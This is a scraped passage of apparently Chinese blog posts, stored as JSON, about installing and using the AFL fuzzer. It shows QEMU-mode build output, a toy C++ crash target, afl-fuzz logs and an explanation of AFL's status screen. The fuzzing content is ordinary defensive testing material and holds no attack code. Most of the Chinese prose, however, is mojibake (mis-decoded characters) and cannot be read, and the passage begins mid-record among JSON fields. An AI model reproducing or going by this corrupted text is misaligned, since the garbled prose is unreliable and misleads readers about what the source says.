avx2 optimization yes replication support yes VxHS block device no [+] Configuration complete. gettid é”™è¯¯ error: static declaration of â€˜gettidâ€™ follows non-static declaration 261 | _syscall0(int, gettid) AFL QEMUæ¨¡å¼å®‰è£…æŠ¥é”™ï¼ˆafl-2.52b &amp; qemu-2.10.0ï¼‰[å·²è§£å†³] util/memfd.c:40:12: error: static declaration of â€˜memfd_create é”™è¯¯ ã€AFL-qemuå®‰è£…é—®é¢˜ã€‘å‡ºç°util/memfd.c:40:12: error: static declaration of â€˜memfd_createâ€™ follows non-static d $ ./build_qemu_support.sh Â·Â·Â·Â·Â·Â·Â·Â· çœç•¥ç¼–è¯‘è¿‡ç¨‹ Â·Â·Â·Â·Â·Â·Â·Â· [+] Build process successful! [*] Copying binary... -rwxr-xr-x 1 root root 14238392 Apr 10 07:54 ../afl-qemu-trace [+] Successfully created '../afl-qemu-trace'. [*] Testing the build... [+] Instrumentation tests passed. [+] All set, you can now use the -Q mode in afl-fuzz! # å°†afl-qemu-trace æ”¾åˆ°ä¸afl-fuzz åŒç›®å½•ä¸‹(/usr/local/bin) å¹¶å°†æ­¤ç›®å½•æ·»åŠ åˆ°ç¯å¢ƒå˜é‡å³å¯ ç¼–å†™C++ä»£ç æµ‹è¯• #include &lt;iostream&gt; #include &lt;string&gt; #include &lt;signal.h&gt; using namespace std; void test (string buf) &#123; int len &#x3D; buf.length(); if (( len &#x3D;&#x3D; 6 &amp;&amp; buf[0] &#x3D;&#x3D; &#39;s&#39; &amp;&amp; buf[1]&#x3D;&#x3D;&#39;i&#39; &amp;&amp; buf[2]&#x3D;&#x3D;&#39;z&#39;)||(len &gt;&#x3D;7 &amp;&amp; buf[0]&#x3D;&#x3D;&#39;x&#39; &amp;&amp; buf[1]&#x3D;&#x3D;&#39;i&#39; &amp;&amp; buf[2]&#x3D;&#x3D;&#39;d&#39; &amp;&amp; buf[3]&#x3D;&#x3D;&#39;i&#39;&amp;&amp; buf[4]&#x3D;&#x3D;&#39;a&#39; &amp;&amp; buf[5]&#x3D;&#x3D;&#39;n&#39;))&#123; cout&lt;&lt;&quot;awesome found sizaif !&quot;&lt;&lt;endl; raise(SIGSEGV); &#125; else&#123; cout&lt;&lt;&quot;sorry not&quot;&lt;&lt;endl; &#125; &#125; int main(int argc, char *argv[]) &#123; string buf &#x3D; &quot;&quot;; cin&gt;&gt;buf; test(buf); return 0; &#125; ç¼–è¯‘å¹¶è¿›è¡Œfuzz $ root@2d34b521fdd5:/home/workhome/afl-test/insc++# afl-fuzz -Q -i in -o crash_qemu ./afltestc++2 afl-fuzz 2.57b by &lt;lcamtuf@google.com> [+] You have 16 CPU cores and 4 runnable tasks (utilization: 25%). [+] Try parallel jobs - see /usr/local/share/doc/afl/parallel_fuzzing.txt. [*] Checking CPU core loadout... [+] Found a free CPU core, binding to #0. [*] Checking core_pattern... [*] Setting up output directories... [+] Output directory exists but deemed OK to reuse. [*] Deleting old session data... [+] Output dir cleanup successful. [*] Scanning 'in'... [+] No auto-generated dictionary tokens to reuse. [*] Creating hard links for all input files... [*] Validating target binary... [*] Attempting dry run with 'id:000000,orig:t.txt'... [*] Spinning up the fork server... [+] All right - fork server is up. len = 6, map size = 58, exec speed = 3060 us [+] All test cases processed. [+] Here are some useful stats: Test case count : 1 favored, 0 variable, 1 total Bitmap range : 58 to 58 bits (average: 58.00 bits) Exec timing : 3060 to 3060 us (average: 3060 us) [*] No -t option specified, so I'll use exec timeout of 20 ms. [+] All set and ready to roll! crash","categories":[{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/navigation/categories/Master/"},{"name":"è®ºæ–‡","slug":"Master/è®ºæ–‡","permalink":"https://www.sizaif.com/navigation/categories/Master/%E8%AE%BA%E6%96%87/"}],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.sizaif.com/tags/fuzzing/"},{"name":"è®ºæ–‡","slug":"è®ºæ–‡","permalink":"https://www.sizaif.com/tags/%E8%AE%BA%E6%96%87/"},{"name":"AFL","slug":"AFL","permalink":"https://www.sizaif.com/tags/AFL/"}],"author":"sizaif"},{"title":"AFL(american Fuzzy Lop)å­¦ä¹ ä¸€","slug":"AFLå­¦ä¹ -ä¸€","date":"2022-04-09T09:58:01.000Z","updated":"2022-04-19T02:42:46.354Z","comments":true,"path":"posts/9cd8386/","link":"","permalink":"https://www.sizaif.com/posts/9cd8386/","excerpt":"","text":"AFL(american fuzzy lop)å­¦ä¹ ä¸€ @sizaif @2022-04-09 AFL çš„æ¨¡ç³Šæ–¹æ³• åŸºäºæ”¹è¿›çš„è¾¹ç¼˜è¦†ç›– æ’æ¡©æ³•å¼•å¯¼çš„é—ä¼ ç®—æ³• æµç¨‹ï¼š æ’æ¡© ä»æºç ç¼–è¯‘ç¨‹åºæ—¶è¿›è¡Œæ’æ¡©ï¼Œä»¥è®°å½•ä»£ç è¦†ç›–ç‡ï¼ˆCode Coverageï¼‰ï¼› é€‰æ‹©ä¸€äº›è¾“å…¥æ–‡ä»¶ï¼Œä½œä¸ºåˆå§‹æµ‹è¯•é›†åŠ å…¥è¾“å…¥é˜Ÿåˆ—ï¼ˆqueueï¼‰ï¼› å°†é˜Ÿåˆ—ä¸­çš„æ–‡ä»¶æŒ‰ä¸€å®šçš„ç­–ç•¥è¿›è¡Œâ€œçªå˜â€ï¼› å¦‚æœç»è¿‡å˜å¼‚æ–‡ä»¶æ›´æ–°äº†è¦†ç›–èŒƒå›´ï¼Œåˆ™å°†å…¶ä¿ç•™æ·»åŠ åˆ°é˜Ÿåˆ—ä¸­; ä¸Šè¿°è¿‡ç¨‹ä¼šä¸€ç›´å¾ªç¯è¿›è¡Œï¼ŒæœŸé—´è§¦å‘äº†crashçš„æ–‡ä»¶ä¼šè¢«è®°å½•ä¸‹æ¥ã€‚ äºŒè¿›åˆ¶ æ”¹è¿›è¾¹ç¼˜è¦†ç›–ï¼š å‘ç›®æ ‡ç¨‹åºæ³¨å…¥ä»¥ä¸‹å·¥å…·æ¥è®°å½•é‡‡ç”¨äº†å“ªäº›åˆ†æ”¯å’Œæ¬¡æ•° ä¸€æ¡è¾¹è¡¨ç¤ºä¸ºå½“å‰åŸºæœ¬å—(åˆ†é…äº†ä¸€ä¸ªéšæœºå¸¸æ•°)ä¸å‰ä¸€ä¸ªåŸºæœ¬å—(å³å…ƒç»„ (prev_location, cur_location))ä¹‹é—´çš„ XOR è¦†ç›–ä¿¡æ¯å­˜å‚¨åœ¨ä¸€ä¸ªç´§å‡‘å…±äº«çš„64KBçš„å“ˆå¸Œè¡¨ä¸­ï¼Œç§°ä¸ºè·Ÿè¸ªä½å›¾(bitmap) å½“è®¿é—®ä¸€æ¡è¾¹æ—¶ï¼Œé€šè¿‡å¢åŠ ä¸è¯¥ç‰¹å®šè¾¹çš„å“ˆå¸Œç›¸å¯¹åº”çš„ä½å›¾ä¸­çš„å€¼æ¥è®°å½•å‘½ä¸­ cur_location &#x3D; &lt;COMPILE_TIME_RANDOM&gt;; shared_mem[cur_location ^ prev_location]++; prev_location &#x3D; cur_location &gt;&gt; 1; Instrumenting programs for use with AFL æºä»£ç å·²çŸ¥çš„æƒ…å†µä¸‹ï¼šç¼–è¯‘æ’æ¡©aflå·¥å…·ï¼š é€šç”¨æ–¹æ³•ï¼š $ CC=/path/to/afl/afl-gcc ./configure # c $ CXX=/path/to/afl/afl-g++ ./configure # c++ $ make clean all å¯¹äºclang(afl-clang and afl-clang++) ä¹Ÿé€‚ç”¨ $ CC=/path/to/afl/afl-clang-fast ./configure [...options...] $ CXX=/path/to/afl/afl-clang-fast++ ./configure [...options...] $ make æµ‹è¯•(libraries)æ—¶ï¼Œ éœ€è¦æ‰¾åˆ°æˆ–ç¼–å†™ä¸€ä¸ªç®€å•çš„ç¨‹åºï¼Œè¯¥ç¨‹åºä»stdinæˆ–æ–‡ä»¶ä¸­è¯»å–æ•°æ®ï¼Œå¹¶å°†æ•°æ®ä¼ é€’ç»™æµ‹è¯•åº“ã€‚ å°†æ­¤å¯æ‰§è¡Œæ–‡ä»¶é“¾æ¥åˆ°å·²æ£€æµ‹åº“çš„é™æ€ç‰ˆæœ¬ï¼Œæˆ–è€…ç¡®ä¿åœ¨è¿è¡Œæ—¶åŠ è½½æ­£ç¡®çš„**.so**æ–‡ä»¶(é€šå¸¸é€šè¿‡è®¾ç½®LD_LIBRARY _PATH)ã€‚æœ€ç®€å•çš„é€‰æ‹©æ˜¯é™æ€æ„å»ºï¼Œé€šå¸¸é€šè¿‡ $ CC(C++)=/path/to/afl/afl-XXX ./configure --disable-shared Instrumenting binary-only apps æ— æ³•è·å¾—æºç æ—¶ï¼Œé’ˆå¯¹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œfuzzerï¼Œ ä½¿ç”¨QEMU $ cd qemu_mode $ ./build_qemu_support.sh æºç  afl-analyzeï¼šç”¨æ¥å¯¹ç”¨ä¾‹è¿›è¡Œåˆ†æï¼Œå‘ç°å…¶ä¸­æœ‰æ„ä¹‰çš„å­—æ®µã€‚ afl-clang++ï¼šç›¸å½“äºc++çš„ç¼–è¯‘å™¨çš„å°è£…ã€‚ afl-fuzzï¼šAFLä¸»ä½“ï¼Œç”¨äºå¯¹ç›®æ ‡ç¨‹åºè¿›è¡Œfuzzã€‚ afl-gccï¼šç›¸å½“äºgccçš„å°è£…ã€‚ afl-plotï¼šç”Ÿæˆæ¨¡ç³Šæµ‹è¯•ä»»åŠ¡çš„çŠ¶æ€å›¾ã€‚ afl-tminï¼šå¯¹ç”¨ä¾‹è¿›è¡Œç®€åŒ–ã€‚ afl-clangï¼šç›¸å½“äºcçš„ç¼–è¯‘å™¨å°è£…ã€‚ afl-cminï¼šå¯¹ç”¨ä¾‹è¿›è¡Œç®€åŒ–ã€‚ afl-g++ï¼šç›¸å½“äºg++çš„å°è£…ã€‚ afl-gotcpuï¼šç”¨äºæŸ¥çœ‹å½“å‰CPUçŠ¶æ€ã€‚ afl-showmapï¼šç”¨äºå¯¹å•ä¸ªç”¨ä¾‹æ‰§è¡Œè·¯å¾„è·Ÿè¸ªã€‚ afl-whatsupï¼šç”¨äºæŸ¥çœ‹fuzzä»»åŠ¡å½“å‰çš„çŠ¶æ€ã€‚ alf-clang-fast: åŸºäºLLVMé«˜æ•ˆclangé’ˆå¯¹c afl-clang-fast++: åŸºäºLLVMé«˜æ•ˆclangé’ˆå¯¹c++ è¾“å‡º è§£é‡Šè¾“å‡º åœ¨è¾“å‡ºç›®å½•ä¸­åˆ›å»ºäº†ä¸‰ä¸ªå­ç›®å½•å¹¶å®æ—¶æ›´æ–° queue/ æ¯ä¸ªç‹¬ç‰¹çš„æ‰§è¡Œè·¯å¾„çš„æµ‹è¯•ç”¨ä¾‹ï¼ŒåŠ ä¸Šç”¨æˆ·ç»™å‡ºçš„æ‰€æœ‰å¼€å§‹æ–‡ä»¶ã€‚è¿™å°±æ˜¯ç¬¬2èŠ‚æåˆ°çš„åˆæˆè¯­æ–™ã€‚åœ¨å°†è¿™ä¸ªè¯­æ–™åº“ç”¨äºä»»ä½•å…¶ä»–ç›®çš„ä¹‹å‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨afl-cminå·¥å…·å°†å®ƒç¼©å°åˆ°æ›´å°çš„å¤§å°ã€‚è¯¥å·¥å…·å°†æ‰¾åˆ°æä¾›åŒç­‰è¾¹ç¼˜è¦†ç›–çš„è¾ƒå°æ–‡ä»¶å­é›†ã€‚ crashes/ å¯¼è‡´è¢«æµ‹è¯•ç¨‹åºæ¥æ”¶è‡´å‘½ä¿¡å·çš„å”¯ä¸€æµ‹è¯•ç”¨ä¾‹(ä¾‹å¦‚SIGSEGV, SIGILL, SIGABRT)ã€‚è¿™äº›æ¡ç›®æŒ‰æ¥æ”¶åˆ°çš„ä¿¡å·åˆ†ç»„ã€‚ hangs/ å¯¼è‡´è¢«æµ‹è¯•ç¨‹åºè¶…æ—¶çš„å”¯ä¸€æµ‹è¯•ç”¨ä¾‹ã€‚åœ¨æŸäº›ä¸œè¥¿è¢«å½’ç±»ä¸ºæŒ‚èµ·ä¹‹å‰çš„é»˜è®¤æ—¶é—´é™åˆ¶å¤§äº1ç§’å’Œ-tå‚æ•°çš„å€¼ã€‚å¯ä»¥é€šè¿‡è®¾ç½®AFL_HANG_TMOUTæ¥å¾®è°ƒè¯¥å€¼ï¼Œä½†å¾ˆå°‘éœ€è¦è¿™æ ·åšã€‚ è¿è¡Œå«ä¹‰ 1) Process timing æŒ‡ç¤ºäº†Fuzzeræµ‹è¯•çš„æ—¶é—´æ¶ˆè€— +----------------------------------------------------+ | run time : 0 days, 8 hrs, 32 min, 43 sec | | last new path : 0 days, 0 hrs, 6 min, 40 sec | | last uniq crash : none seen yet | | last uniq hang : 0 days, 1 hrs, 24 min, 32 sec | +----------------------------------------------------+ process timing æŒ‡ç¤ºäº†Fuzzeræµ‹è¯•çš„æ—¶é—´æ¶ˆè€— run time: è¿è¡Œæ€»æ—¶é—´ last new path: path(è§¦å‘æ–°æ‰§è¡Œçš„æµ‹è¯•ç”¨ä¾‹çš„ç¼©å†™)ï¼Œä¸Šæ¬¡æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹çš„æ—¶é—´,é•¿æ—¶é—´æœªå˜åŒ–è¯´æ˜æœ‰ç¨‹åºæœ‰é—®é¢˜ï¼Œè¿‡äºç®€å•æ— åˆ†æ”¯æˆ–å†…å­˜å¤ªå°ä¼šæ”¶åˆ°ä¸€ä¸ªçº¢è‰²è­¦å‘Š last uniq crash: ä¸Šæ¬¡å´©æºƒçš„æ—¶é—´ last uniq hang: ä¸Šæ¬¡æŒ‚èµ·çš„æ—¶é—´ 2) Overall results æ±‡æ€»äº†fuzzeræµ‹è¯•çš„æ‰§è¡Œç»“æœã€‚ +-----------------------+ | cycles done : 0 | | total paths : 2095 | | uniq crashes : 0 | | uniq hangs : 19 | +-----------------------+ cycle done: è¡¨æ˜fuzzerçš„è½®æ•° é¢œè‰²è¯´æ˜ å“çº¢è‰²å¤„äº the first passï¼Œ å¦‚æœæœ‰æ–°å‘ç°ï¼Œé¢œè‰²ä¼šå˜æˆé»„è‰²ï¼Œ æ‰€æœ‰å­è¿‡ç¨‹å®Œæˆåå°†ä¼šå˜æˆè“è‰²ï¼Œ æœ€åå˜æˆç»¿è‰²çš„è¯è¡¨æ˜å·²ç»é•¿æ—¶é—´æ²¡æœ‰æ–°çš„åŠ¨ä½œäº†ï¼Œæ­¤æ—¶ä¹Ÿæç¤ºæˆ‘ä»¬åº”è¯¥æ‰‹åŠ¨ctrl-cå»å…³é—­fuzzingã€‚ total paths: ç›®å‰ä¸ºæ­¢æ‰§è¡Œçš„æµ‹è¯•ç”¨ä¾‹ uniq crashes: ç›®å‰ä¸ºæ­¢å‘ç°çš„å´©æºƒ uniq hang: ç›®å‰ä¸ºæ­¢å‘ç°çš„æŒ‚èµ· 3) Cycle progress å±•ç¤ºäº†å½“å‰é˜Ÿåˆ—ä¸­fuzzer æ‰§è¡Œäº†å¤šå°‘ +-------------------------------------+ | now processing : 1296 (61.86%) | | paths timed out : 0 (0.00%) | +-------------------------------------+ ow processing: å½“å‰æµ‹è¯•ç”¨ä¾‹çš„è¿›ç¨‹çš„ID å› ä¸ºfuzzeræ˜¯å¼€å¯å¦ä¸€ä¸ªè¿›ç¨‹è¿›è¡Œæµ‹è¯•çš„ ç»“æœå†™å›å…±äº«å†…å­˜ä¸­ paths timed out: æ ¹æ®è¶…æ—¶å†³å®šæ˜¯å¦æ”¾å¼ƒ 4) Map coverage +--------------------------------------+ | map density : 10.15% &#x2F; 29.07% | | count coverage : 4.03 bits&#x2F;tuple | +--------------------------------------+ map densityï¼šå¤šå°‘ä¸ªåˆ†æ”¯å…ƒç»„,å‘½ä¸­ï¼Œä¸ä½å›¾çš„å®¹é‡æˆæ¯”ä¾‹.å·ç åœ¨å·¦è¾¹æè¿°å½“å‰è¾“å…¥;å³è¾¹çš„æ˜¯æ•´ä½“çš„å€¼æ˜¯è¾“å…¥è¯­æ–™åº“ã€‚ç»å¯¹å€¼ä½äºäºŒç™¾è¯´çš„æ˜¯è¡¨æ˜äº†ä»¥ä¸‹ä¸‰ç§æƒ…å†µä¹‹ä¸€ ç¨‹åºæå…¶ç®€å•;å®ƒæ²¡æœ‰è¢«æ­£ç¡®åœ°ä½¿ç”¨(ä¾‹å¦‚ï¼Œç”±äºé“¾æ¥åˆ°ç›®æ ‡çš„éå·¥å…·å‰¯æœ¬å›¾ä¹¦é¦†);æˆ–è€…å®ƒè¿‡æ—©åœ°é€€å‡ºäº†æ‚¨çš„è¾“å…¥æµ‹è¯•ç”¨ä¾‹ã€‚ç»’æ¯›ä¼šå°è¯•ç”¨ç²‰çº¢è‰²æ ‡è®°ï¼Œåªæ˜¯ä¸ºäº†è®©ä½ æ„è¯†åˆ°ã€‚è¶…è¿‡70%çš„ç™¾åˆ†æ¯”å¯èƒ½å¾ˆå°‘å‘ç”Ÿåœ¨éå¸¸å¤æ‚çš„ç¨‹åºå¤§é‡ä½¿ç”¨æ¨¡æ¿ç”Ÿæˆçš„ä»£ç ã€‚å°†ä»¥çº¢è‰²æ ‡è®°é«˜ç™¾åˆ†æ¯”ã€‚ä½†æ˜¯ä¸€èˆ¬ä¸ä¼šæœ‰çº¢è‰²æ ‡è®°é™¤éä½ ç”¨çš„æ˜¯éå¸¸å¤æ‚çš„è½¯ä»¶(æ¯”å¦‚v8, perlï¼Œffmpeg)ã€‚ count coverageï¼šå¦ä¸€è¡Œå¤„ç†å…ƒç»„å‘½ä¸­æ¬¡æ•°çš„å¯å˜æ€§äºŒè¿›åˆ¶æ–‡ä»¶ã€‚æœ¬è´¨ä¸Šï¼Œå¦‚æœæ¯ä¸€ä¸ªè¢«å–çš„åˆ†æ”¯æ€»æ˜¯å–ä¸€ä¸ªå›ºå®šæ•°é‡çš„å¯¹äºæˆ‘ä»¬å°è¯•è¿‡çš„æ‰€æœ‰è¾“å…¥ï¼Œè¿™å°†æ˜¯â€œ1.00â€ã€‚å½“æˆ‘ä»¬ç®¡ç†ä¸ºäº†è§¦å‘æ¯ä¸ªåˆ†æ”¯çš„å…¶ä»–å‘½ä¸­è®¡æ•°ï¼ŒæŒ‡é’ˆå°†å¼€å§‹ç§»åŠ¨æ¥è¿‘â€œ8.00â€(8ä½åœ°å›¾å‘½ä¸­çš„æ¯ä¸€ä¸ªä½)ï¼Œä½†å¯èƒ½æ°¸è¿œä¸ä¼šè¾¾åˆ°è¿™ä¸€æç«¯ã€‚ 5) Stage progress è¿›ä¸€æ­¥å±•ç¤ºäº†fuzzerçš„æ‰§è¡Œè¿‡ç¨‹ç»†èŠ‚ã€‚ +-------------------------------------+ | now trying : interest 32&#x2F;8 | | stage execs : 3996&#x2F;34.4k (11.62%) | | total execs : 27.4M | | exec speed : 891.7&#x2F;sec | +-------------------------------------+ now trying: æŒ‡æ˜å½“å‰æ‰€ç”¨çš„å˜å¼‚è¾“å…¥çš„æ–¹æ³• å‚æ•°å«ä¹‰ calibration â€“ åœ¨fuzzingæµ‹è¯•ä¹‹å‰çš„é˜¶æ®µï¼Œä¸»è¦æ˜¯æ£€æŸ¥æ‰§è¡Œè·¯å¾„æ£€æµ‹å¼‚å¸¸ï¼Œå»ºç«‹åŸºçº¿æ‰§è¡Œé€Ÿåº¦ã€‚ trim L/S â€“ åŒæ ·ä¹Ÿæ˜¯åœ¨fuzzingæµ‹è¯•ä¹‹å‰çš„é˜¶æ®µï¼Œä¿®å»ºæµ‹è¯•ç”¨ä¾‹ä½¿å…¶æ›´çŸ­ï¼Œä½†ä¿è¯è£å‰ªåä»èƒ½è¾¾åˆ°ç›¸åŒçš„æ‰§è¡Œè·¯å¾„ã€‚Lè¡¨ç¤ºlengthé•¿åº¦ï¼ŒSè¡¨ç¤ºstepoveræ­¥è·ï¼Œå…¶å€¼ä¸æ–‡ä»¶å¤§å°æ˜¯ç›¸å…³çš„ã€‚ bitflip L/S â€“ ç¡®å®šæ€§çš„æ¯”ç‰¹ä½ç¿»è½¬ã€‚ä»¥Sä¸ºå¢é‡ï¼ŒLé•¿åº¦çš„bitæ•°è¢«ç¿»è½¬ã€‚æœ‰ä»¥ä¸‹å‡ ç§å˜å‹æ¨¡å¼ï¼š1/1, 2/1, 4/1, 8/8, 16/8, 32/8ã€‚ arith L/8 â€“ ç¡®å®šæ€§çš„ç®—æœ¯è¿ç®—ã€‚AFLä¼šå°è¯•å»å‡å»æˆ–è€…åŠ ä¸Šä¸€äº›æ•´æ•°ä½¿å…¶ä¸º8bit/16bit/32bitçš„å€¼ï¼Œæ­¥è·æ°¸è¿œæ˜¯8bitsã€‚ interest L/8 â€“ ç¡®å®šæ€§çš„å€¼è¦†ç›–ã€‚AFLè‡ªèº«ä¿ç•™äº†ä¸€äº›Interestingçš„8bit/16bit/32bitçš„å€¼ï¼Œç”¨è¿™äº›å€¼å»è¦†ç›–åŸæœ‰çš„æµ‹è¯•ç”¨ä¾‹ï¼Œæ­¥è·æ°¸è¿œæ˜¯8bitsã€‚ extras â€“ ç¡®å®šæ€§çš„å­—å…¸æ³¨å…¥ã€‚è¿™é‡ŒAFLè‡ªèº«æœ‰ä¸€ä¸ªå­—å…¸ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨-xé€‰é¡¹æ¥æŒ‡æ˜ä½¿ç”¨ç”¨æˆ·æä¾›çš„å­—å…¸ã€‚ havoc â€“ å›ºå®šé•¿åº¦çš„å †å éšæœºæ‰­æ›²ã€‚è¯¥é˜¶æ®µä¼šå°è¯•ä½ç¿»è½¬ï¼Œç”¨éšæœºæ•°æˆ–è€…Interestingçš„æ•´æ•°å»è¦†ç›–ï¼Œå—åˆ é™¤ï¼Œå—å¤åˆ¶ï¼Œä»¥åŠå­—å…¸çš„ç›¸å…³æ“ä½œã€‚ splice â€“ æœ€åä¸€ç§ç­–ç•¥ã€‚åœ¨ä¸Šè¿°ç­–ç•¥éƒ½æ‰§è¡Œå®Œåå°†ä¼šæ‰§è¡Œè¯¥ç­–ç•¥ï¼Œå®ƒå’Œhavocå·®ä¸å¤šï¼Œä¸è¿‡å®ƒä¼šé¦–å…ˆå°†é˜Ÿåˆ—ä¸­çš„ä¸¤ä¸ªéšæœºè¾“å…¥å…ˆæ‹¼æ¥åœ¨ä¸€èµ·ã€‚ sync â€“ è¿™ä¸ªæ˜¯å¹¶è¡Œæ‰§è¡Œçš„ç­–ç•¥é€‰é¡¹ï¼Œé€šè¿‡-Mæˆ–è€…-Sé€‰é¡¹è¿›è¡ŒæŒ‡å®šã€‚è¯¥ç­–ç•¥å¹¶ä¸ä¼šæ¶‰åŠåˆ°çœŸæ­£çš„fuzzingï¼Œä¼šå¯¼å…¥ä»å¦ä¸€ä¸ªfuzzerå¾—åˆ°çš„è¾“å‡ºå’Œæµ‹è¯•ç”¨ä¾‹ã€‚ ä»¥ä¸Šæ‰€æœ‰ç­–ç•¥æ‰§è¡Œä¸€éä¹Ÿå°±æ˜¯å‰æ–‡æåˆ°çš„the first passã€‚ stage execs: å½“å‰é˜¶æ®µçš„è¿›åº¦æŒ‡ç¤º total execs: å…¨å±€çš„è¿›åº¦æŒ‡ç¤º exec speed: æ‰§è¡Œé€Ÿåº¦ä½†æ˜¯åŸºå‡†æµ‹è¯•åº”è¯¥ç†æƒ³åœ°è¶…è¿‡500æ¬¡æ‰§è¡Œ/ç§’å¤§å¤šæ•°æ—¶å€™â€”â€”å¦‚æœå®ƒä¿æŒåœ¨100ä»¥ä¸‹ï¼Œè¿™é¡¹å·¥ä½œå¯èƒ½ä¼šéå¸¸é•¿ã€‚fuzzerä¹Ÿä¼šæ˜ç¡®åœ°è­¦å‘Šä½ ç¼“æ…¢çš„ç›®æ ‡ã€‚å¦‚æœå‘ç”Ÿè¿™ç§æƒ…å†µ,æŸ¥çœ‹fuzzerä¸­åŒ…å«çš„perf_tips.txtæ–‡ä»¶ï¼Œäº†è§£å¦‚ä½•æé«˜é€Ÿåº¦çš„äº‹æƒ…äº†ã€‚ 6) Findings in depth åº”è¯¥æ˜¯ç§å­å˜å¼‚äº§ç”Ÿçš„ä¿¡æ¯ +--------------------------------------+ | favored paths : 879 (41.96%) | | new edges on : 423 (20.19%) | | total crashes : 0 (0 unique) | | total tmouts : 24 (19 unique) | +--------------------------------------+ favored paths: åŸºäºæœ€å°åŒ–ç®—æ³•äº§ç”Ÿæ–°çš„æ›´å¥½çš„è·¯å¾„ new edges on: åŸºäºæ›´å¥½è·¯å¾„äº§ç”Ÿçš„æ–°è¾¹ total crashes: åŸºäºæ›´å¥½è·¯å¾„äº§ç”Ÿçš„å´©æºƒ total tmouts: åŸºäºæ›´å¥½è·¯å¾„äº§ç”Ÿçš„è¶…æ—¶ åŒ…æ‹¬æ‰€æœ‰è¶…æ—¶çš„è¶…æ—¶ å³ä½¿è¿™äº›è¶…æ—¶ä¸è¶³ä»¥åˆ†ç±»åˆ°hangs. 7) Fuzzing strategy yields è¿›ä¸€æ­¥å±•ç¤ºäº†AFLæ‰€åšçš„å·¥ä½œï¼Œåœ¨æ›´æœ‰æ•ˆè·¯å¾„ä¸Šå¾—åˆ°çš„ç»“æœæ¯”ä¾‹ é’ˆå¯¹çš„åº”è¯¥æ˜¯ä¸Šæ–‡çš„ stage progressçš„now tryingä¸€æ çš„å‚æ•° +-----------------------------------------------------+ | bit flips : 57&#x2F;289k, 18&#x2F;289k, 18&#x2F;288k | | byte flips : 0&#x2F;36.2k, 4&#x2F;35.7k, 7&#x2F;34.6k | | arithmetics : 53&#x2F;2.54M, 0&#x2F;537k, 0&#x2F;55.2k | | known ints : 8&#x2F;322k, 12&#x2F;1.32M, 10&#x2F;1.70M | | dictionary : 9&#x2F;52k, 1&#x2F;53k, 1&#x2F;24k | | havoc : 1903&#x2F;20.0M, 0&#x2F;0 | | trim : 20.31%&#x2F;9201, 17.05% | +-----------------------------------------------------+ bit flips: ç¡®å®šæ€§çš„æ¯”ç‰¹ä½ç¿»è½¬ã€‚ä»¥Sä¸ºå¢é‡ï¼ŒLé•¿åº¦çš„bitæ•°è¢«ç¿»è½¬ã€‚æœ‰ä»¥ä¸‹å‡ ç§å˜å‹æ¨¡å¼ï¼š1/1, 2/1, 4/1, 8/8, 16/8, 32/8ã€‚ byte flips: è¿™ä¸ªåº”è¯¥å°±æ˜¯å­—èŠ‚ç¿»è½¬äº† arithmetics: â€“ ç¡®å®šæ€§çš„ç®—æœ¯è¿ç®—ã€‚AFLä¼šå°è¯•å»å‡å»æˆ–è€…åŠ ä¸Šä¸€äº›æ•´æ•°ä½¿å…¶ä¸º8bit/16bit/32bitçš„å€¼ï¼Œæ­¥è·æ°¸è¿œæ˜¯8bitsã€‚ known ints: dictionary: havoc:â€“ å›ºå®šé•¿åº¦çš„å †å éšæœºæ‰­æ›²ã€‚è¯¥é˜¶æ®µä¼šå°è¯•ä½ç¿»è½¬ï¼Œç”¨éšæœºæ•°æˆ–è€…Interestingçš„æ•´æ•°å»è¦†ç›–ï¼Œå—åˆ é™¤ï¼Œå—å¤åˆ¶ï¼Œä»¥åŠå­—å…¸çš„ç›¸å…³æ“ä½œã€‚ trim:â€“ åŒæ ·ä¹Ÿæ˜¯åœ¨fuzzingæµ‹è¯•ä¹‹å‰çš„é˜¶æ®µï¼Œä¿®å»ºæµ‹è¯•ç”¨ä¾‹ä½¿å…¶æ›´çŸ­ï¼Œä½†ä¿è¯è£å‰ªåä»èƒ½è¾¾åˆ°ç›¸åŒçš„æ‰§è¡Œè·¯å¾„ã€‚Lè¡¨ç¤ºlengthé•¿åº¦ï¼ŒSè¡¨ç¤ºstepoveræ­¥è·ï¼Œå…¶å€¼ä¸æ–‡ä»¶å¤§å°æ˜¯ç›¸å…³çš„ã€‚ è¿™ä¸ªä¿®å‰ªç­–ç•¥æœ‰ä¸€äº›ä¸åŒ/ è¿™ä¸€è¡Œä¸­çš„ç¬¬ä¸€ä¸ªæ•°å­—æ˜¾ç¤ºäº†ä»è¾“å…¥ä¸­åˆ é™¤çš„å­—èŠ‚çš„æ¯”ç‡ï¼Œç¬¬äºŒä¸ªæ•°å­—è¡¨ç¤ºå®ç°è¿™ä¸€ç›®æ ‡éœ€è¦çš„æ‰§è¡Œæ•°ï¼Œç¬¬ä¸‰ä¸ªæ•°å­—æ˜¾ç¤ºäº†å­—èŠ‚çš„æ¯”ä¾‹ï¼Œå°½ç®¡ä¸å¯èƒ½ç§»é™¤ï¼Œè¢«è§†ä¸ºæ²¡æœ‰æ•ˆæœï¼Œåœ¨è¿›è¡Œæ•ˆæœæ›´å¥½çš„fuzzeræ­¥éª¤çš„æ—¶å€™ä¸æ˜¯è€ƒè™‘çš„å› ç´  8) Path geometry æ±‡æ€»äº†è·¯å¾„æµ‹è¯•çš„ç›¸å…³ä¿¡æ¯ã€‚ +---------------------+ | levels : 5 | | pending : 1570 | | pend fav : 583 | | own finds : 0 | | imported : 0 | | stability : 100.00% | +---------------------+ levels: è¡¨ç¤ºæµ‹è¯•ç­‰çº§ pending: è¡¨ç¤ºè¿˜æ²¡æœ‰ç»è¿‡fuzzingçš„è¾“å…¥æ•°é‡ pend fav: è¡¨æ˜fuzzeræ„Ÿå…´è¶£çš„è¾“å…¥æ•°é‡ own finds: è¡¨ç¤ºåœ¨fuzzingè¿‡ç¨‹ä¸­æ–°æ‰¾åˆ°çš„ï¼Œæˆ–è€…æ˜¯å¹¶è¡Œæµ‹è¯•ä»å¦ä¸€ä¸ªå®ä¾‹å¯¼å…¥çš„ imported: n/aè¡¨æ˜ä¸å¯ç”¨ï¼Œå³æ²¡æœ‰å¯¼å…¥ stability: 